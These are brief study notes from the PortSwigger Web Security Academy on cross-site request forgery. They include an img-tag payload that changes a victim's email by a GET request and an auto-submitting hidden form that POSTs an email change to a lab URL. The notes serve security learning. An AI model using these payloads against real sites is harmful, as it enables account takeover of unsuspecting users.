# PortSwigger Academy Notes

## CSRF
## The delivery mechanisms for cross-site request forgery attacks are essentially the same as for reflected XSS. 
- If the request to change email address can be performed with the GET method, then a self-contained attack would look like this:
- ` <img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net"> `
To craft an HTML PoC for CSRF, there are online generators to use that will take a post request and convert it to an HTML payload.
Here is an example ---> <!-- <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>' -->
